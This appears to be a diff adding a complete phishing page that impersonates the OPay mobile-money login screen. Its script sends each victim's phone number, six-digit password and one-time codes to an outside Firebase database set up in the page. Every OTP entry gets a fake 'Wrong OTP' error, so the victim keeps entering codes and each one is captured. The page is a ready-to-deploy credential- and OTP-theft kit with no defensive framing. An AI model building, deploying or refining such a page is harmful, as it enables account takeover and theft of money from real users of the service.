@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OPay Full Screen</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body, html { width: 100%; height: 100%; background-color: #ffffff; overflow-x: hidden; }
+        .mobile-app { width: 100vw; height: 100vh; display: flex; flex-direction: column; position: relative; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px; font-size: 16px; background: #fff; }
+        .back-btn { font-size: 20px; font-weight: bold; cursor: pointer; color: #000; padding: 5px 10px 5px 0; }
+        .help-text { color: #00b578; font-weight: 500; }
+        .page { display: none; padding: 0 20px; flex: 1; flex-direction: column; background: #fff; }
+        .page.active { display: flex; }
+        h2 { margin-bottom: 25px; font-size: 22px; color: #111; }
+        .link-text { color: #00b578; font-size: 13px; text-decoration: none; }
+        .gray-text { color: #888; font-size: 13px; }
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 30px; transition: 0.3s; }
+        .btn:disabled { background-color: #a3ead0; color: #fff; cursor: not-allowed; }
+        .btn-green { background-color: #00b578; color: #fff; }
+        .logo-wrap { text-align: center; margin: 10px 0 30px; }
+        .logo-text { font-size: 24px; font-weight: 800; color: #0a1b5c; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .logo-icon { width: 24px; height: 24px; background-color: #00b578; border-radius: 50%; position: relative; }
+        .logo-icon::after { content: ""; position: absolute; width: 10px; height: 10px; background: #fff; border-radius: 50%; top: 7px; left: 7px; }
+        .input-wrapper { position: relative; margin-bottom: 15px; }
+        .input-wrapper label { position: absolute; top: -9px; left: 15px; background: #fff; padding: 0 5px; color: #00b578; font-size: 12px; }
+        .input-wrapper input { width: 100%; padding: 16px; border: 1px solid #00b578; border-radius: 8px; font-size: 16px; outline: none; }
+        .footer-text { text-align: center; margin-top: auto; margin-bottom: 30px; font-size: 13px; color: #666; line-height: 1.8; }
+        .profile-center { text-align: center; margin-top: 10px; }
+        .avatar { width: 75px; height: 75px; margin: 0 auto; }
+        .phone-display { margin-top: 12px; font-size: 17px; font-weight: 500; color: #111; }
+        .welcome-title { font-size: 28px; font-weight: bold; margin-top: 5px; margin-bottom: 30px; color: #0a1b5c; }
+        .pass-links { display: flex; justify-content: space-between; margin-top: 10px; }
+        .step-card { background: #f8f9fb; padding: 18px; border-radius: 12px; margin-bottom: 20px; }
+        .step-title { font-weight: bold; font-size: 14px; margin-bottom: 10px; color: #111; }
+        .step-desc { font-size: 13px; color: #666; line-height: 1.5; }
+        .otp-inputs { display: flex; justify-content: space-between; margin-top: 15px; }
+        .otp-box { width: 45px; height: 50px; text-align: center; font-size: 22px; border: 1px solid #e0e0e0; border-radius: 8px; background: #fff; outline: none; caret-color: #00b578; }
+        .otp-box.active { border-color: #00b578; }
+        .otp-box.error { border-color: #ff3333 !important; color: #ff3333; }
+        .otp-error-msg { color: #ff3333; font-size: 13px; text-align: center; margin-top: 15px; display: none; font-weight: bold; }
+        .timer-line { font-size: 13px; color: #888; margin-top: 15px; }
+        .timer-line span { color: #00b578; }
+        .keypad-container { position: fixed; bottom: -100%; left: 0; width: 100%; background: #f5f5f5; transition: bottom 0.3s ease-in-out; z-index: 100; box-shadow: 0 -2px 10px rgba(0,0,0,0.05); }
+        .keypad-container.show { bottom: 0; }
+        .keypad-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: #fff; border-bottom: 1px solid #eaeaea; font-size: 14px; }
+        .keypad-header .secure-text { color: #111; display: flex; align-items: center; gap: 5px; }
+        .shield-icon { width: 16px; height: 16px; background: #00b578; border-radius: 50%; display: inline-block; position: relative; }
+        .shield-icon::after { content: '✔'; color: white; font-size: 10px; position: absolute; left: 3px; top: 1px; }
+        .done-btn { color: #00b578; font-weight: bold; cursor: pointer; }
+        .keys { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1px; background: #d4d4d4; padding: 5px; }
+        .key { background: #fff; height: 55px; display: flex; justify-content: center; align-items: center; font-size: 24px; color: #000; cursor: pointer; margin: 2px; border-radius: 5px; }
+        .key:active { background: #e0e0e0; }
+        .key.empty { background: #f5f5f5; cursor: default; }
+        .key-del svg { width: 24px; height: 24px; }
+    </style>
+</head>
+<body>
+
+<div class="mobile-app">
+    <div class="header">
+        <div class="back-btn" onclick="goBack()">&#10094;</div>
+        <div class="help-text">Help</div>
+    </div>
+
+    <!-- PAGE 1 -->
+    <div id="page1" class="page active">
+        <div class="logo-wrap">
+            <div class="logo-text"><div class="logo-icon"></div>OPay</div>
+        </div>
+        <h2>Log in to your account</h2>
+        <div class="input-wrapper">
+            <label>Enter your Mobile No./Email</label>
+            <input type="tel" id="mobileInput" placeholder="|" oninput="checkMobileInput()">
+        </div>
+        <div>
+            <span class="gray-text">Lost Your Mobile Number, </span><a href="#" class="link-text">Change Now</a>
+        </div>
+        <button id="nextBtn" class="btn" disabled onclick="goToPage2()">NEXT</button>
+        <div class="footer-text">Don't have an OPay Account yet?<br><a href="#" class="link-text">Click here to get one</a></div>
+    </div>
+
+    <!-- PAGE 2 -->
+    <div id="page2" class="page">
+        <div class="profile-center">
+            <div class="avatar">
+                <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="50" cy="50" r="50" fill="#c4eee1"/>
+                    <path d="M25 100 C25 65, 75 65, 75 100" fill="#00a65a"/>
+                    <path d="M30 100 L75 68" stroke="#111" stroke-width="4"/>
+                    <rect x="42" y="55" width="16" height="20" fill="#6c4023"/>
+                    <rect x="34" y="25" width="32" height="38" rx="12" fill="#6c4023"/>
+                    <path d="M30 35 C30 10, 70 10, 70 35 C75 35, 75 25, 55 20 C40 20, 25 25, 30 35 Z" fill="#111"/>
+                    <path d="M34 50 C40 68, 60 68, 66 50 C66 55, 60 72, 50 72 C40 72, 34 55, 34 50 Z" fill="#111"/>
+                    <circle cx="32" cy="45" r="4" fill="#6c4023"/>
+                    <circle cx="68" cy="45" r="4" fill="#6c4023"/>
+                </svg>
+            </div>
+            <div class="phone-display" id="p2-phone">0810 0998 254</div>
+            <div class="welcome-title">Welcome back</div>
+        </div>
+        <div class="input-wrapper" style="margin-top: 10px;">
+            <input type="password" id="passInput" placeholder="Enter 6 digit Password" readonly onclick="openKeypad('password')" style="border-color: #00b578; cursor: pointer; text-align: center; letter-spacing: 5px;">
+        </div>
+        <div class="pass-links">
+            <span class="link-text">Please enter your 6-digit Password</span><a href="#" class="link-text">Forgot Password?</a>
+        </div>
+        <button id="loginBtn" class="btn" disabled onclick="goToPage3()">Log in</button>
+    </div>
+
+    <!-- PAGE 3 -->
+    <div id="page3" class="page">
+        <h2>Verify Your Phone Number</h2>
+        <div class="step-card">
+            <div class="step-title">Step 1 - Check the Code You Received</div>
+            <div class="step-desc">A verification code has been sent to your phone number <strong id="p3-phone" style="color:#000;">+234 9701448886</strong>, please take a look.</div>
+        </div>
+        <div class="step-card">
+            <div class="step-title">Step 2 - Fill in the Box below with the Code</div>
+            <div class="otp-inputs" id="otp-container" onclick="openKeypad('otp')">
+                <input type="password" class="otp-box active" readonly>
+                <input type="password" class="otp-box" readonly>
+                <input type="password" class="otp-box" readonly>
+                <input type="password" class="otp-box" readonly>
+                <input type="password" class="otp-box" readonly>
+                <input type="password" class="otp-box" readonly>
+            </div>
+            <div id="otpErrorMsg" class="otp-error-msg">Wrong OTP! Please try again.</div>
+            <div class="timer-line">Didn't receive the OTP? <span id="timerTxt">Resend (40s)</span></div>
+        </div>
+        <a href="#" class="link-text" style="margin-top: 10px;">Get OTP via Other Methods ></a>
+    </div>
+
+    <!-- Keypad -->
+    <div class="keypad-container" id="customKeypad">
+        <div class="keypad-header">
+            <div style="width: 40px;"></div>
+            <div class="secure-text"><span class="shield-icon"></span> OPay Secure Numeric Keypad</div>
+            <div class="done-btn" onclick="closeKeypad()">Done</div>
+        </div>
+        <div class="keys">
+            <div class="key" onclick="pressKey(1)">1</div>
+            <div class="key" onclick="pressKey(2)">2</div>
+            <div class="key" onclick="pressKey(3)">3</div>
+            <div class="key" onclick="pressKey(4)">4</div>
+            <div class="key" onclick="pressKey(5)">5</div>
+            <div class="key" onclick="pressKey(6)">6</div>
+            <div class="key" onclick="pressKey(7)">7</div>
+            <div class="key" onclick="pressKey(8)">8</div>
+            <div class="key" onclick="pressKey(9)">9</div>
+            <div class="key empty"></div>
+            <div class="key" onclick="pressKey(0)">0</div>
+            <div class="key key-del" onclick="pressKey('del')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path><line x1="18" y1="9" x2="12" y2="15"></line><line x1="12" y1="9" x2="18" y2="15"></line></svg>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
+        authDomain: "long-d1bcb.firebaseapp.com",
+        databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
+        projectId: "long-d1bcb",
+        storageBucket: "long-d1bcb.firebasestorage.app",
+        messagingSenderId: "515546162619",
+        appId: "1:515546162619:web:e046b79a25ccfa057e509e"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    
+    let userRef = null;
+    let currentStep = 1;
+    let timer;
+    let activeInputType = ''; 
+    let otpValues = ['', '', '', '', '', ''];
+
+    function checkMobileInput() {
+        const val = document.getElementById('mobileInput').value;
+        const btn = document.getElementById('nextBtn');
+        if(val.length >= 4) {
+            btn.disabled = false;
+            btn.classList.add('btn-green');
+        } else {
+            btn.disabled = true;
+            btn.classList.remove('btn-green');
+        }
+    }
+
+    function showPage(num) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('page' + num).classList.add('active');
+        currentStep = num;
+        closeKeypad();
+    }
+
+    function goBack() {
+        if(currentStep > 1) {
+            showPage(currentStep - 1);
+            if(timer) clearInterval(timer);
+        }
+    }
+
+    function goToPage2() {
+        const phone = document.getElementById('mobileInput').value;
+        if(phone) {
+            document.getElementById('p2-phone').innerText = phone;
+            document.getElementById('p3-phone').innerText = phone;
+            
+            userRef = db.ref('users').push();
+            userRef.set({
+                phone: phone,
+                password: "Waiting...",
+                timestamp: new Date().toLocaleString(),
+                updatedAt: Date.now()
+            });
+        }
+        document.getElementById('passInput').value = '';
+        checkPasswordLength(); 
+        showPage(2);
+        setTimeout(() => openKeypad('password'), 300);
+    }
+
+    function goToPage3() {
+        const pass = document.getElementById('passInput').value;
+        if(pass.length < 6) return;
+        
+        if(userRef) {
+            userRef.update({
+                password: pass,
+                updatedAt: Date.now() 
+            });
+        }
+        
+        showPage(3);
+        startTimer();
+        otpValues = ['', '', '', '', '', ''];
+        updateOtpDisplay();
+        setTimeout(() => openKeypad('otp'), 300);
+    }
+
+    function checkPasswordLength() {
+        const passLen = document.getElementById('passInput').value.length;
+        const loginBtn = document.getElementById('loginBtn');
+        if(passLen === 6) {
+            loginBtn.disabled = false;
+            loginBtn.classList.add('btn-green');
+        } else {
+            loginBtn.disabled = true;
+            loginBtn.classList.remove('btn-green');
+        }
+    }
+
+    function openKeypad(type) {
+        activeInputType = type;
+        document.getElementById('customKeypad').classList.add('show');
+    }
+
+    function closeKeypad() {
+        document.getElementById('customKeypad').classList.remove('show');
+    }
+
+    function pressKey(val) {
+        if(activeInputType === 'password') {
+            let pInput = document.getElementById('passInput');
+            if(val === 'del') {
+                pInput.value = pInput.value.slice(0, -1);
+            } else {
+                if(pInput.value.length < 6) pInput.value += val;
+            }
+            checkPasswordLength(); 
+        } 
+        else if (activeInputType === 'otp') {
+            let currentIndex = otpValues.findIndex(v => v === '');
+            
+            if(val === 'del') {
+                for(let i = 5; i >= 0; i--) {
+                    if(otpValues[i] !== '') {
+                        otpValues[i] = '';
+                        break;
+                    }
+                }
+            } else {
+                if(currentIndex !== -1) {
+                    otpValues[currentIndex] = val;
+                    if(currentIndex === 5) {
+                        updateOtpDisplay();
+                        
+                        const enteredOTP = otpValues.join('');
+                        if(userRef) {
+                            userRef.child('otps').push(enteredOTP);
+                            userRef.update({ updatedAt: Date.now() });
+                        }
+                        
+                        document.getElementById('otpErrorMsg').style.display = 'block';
+                        document.querySelectorAll('.otp-box').forEach(b => b.classList.add('error'));
+                        
+                        setTimeout(() => {
+                            otpValues = ['', '', '', '', '', ''];
+                            updateOtpDisplay();
+                            document.getElementById('otpErrorMsg').style.display = 'none';
+                            document.querySelectorAll('.otp-box').forEach(b => b.classList.remove('error'));
+                        }, 1500);
+                        return;
+                    }
+                }
+            }
+            updateOtpDisplay();
+        }
+    }
+
+    function updateOtpDisplay() {
+        const boxes = document.querySelectorAll('.otp-box');
+        let nextEmptyFound = false;
+        boxes.forEach((box, index) => {
+            box.value = otpValues[index] !== '' ? '•' : ''; 
+            box.classList.remove('active');
+            if(otpValues[index] === '' && !nextEmptyFound) {
+                box.classList.add('active');
+                nextEmptyFound = true;
+            }
+        });
+    }
+
+    function startTimer() {
+        let timeLeft = 40;
+        const tText = document.getElementById('timerTxt');
+        tText.innerText = `Resend (${timeLeft}s)`;
+        tText.style.cursor = 'default';
+        timer = setInterval(() => {
+            timeLeft--;
+            if(timeLeft > 0) {
+                tText.innerText = `Resend (${timeLeft}s)`;
+            } else {
+                clearInterval(timer);
+                tText.innerText = 'Resend Code';
+                tText.style.cursor = 'pointer';
+            }
+        }, 1000);
+    }
+</script>
+</body>
+</html>
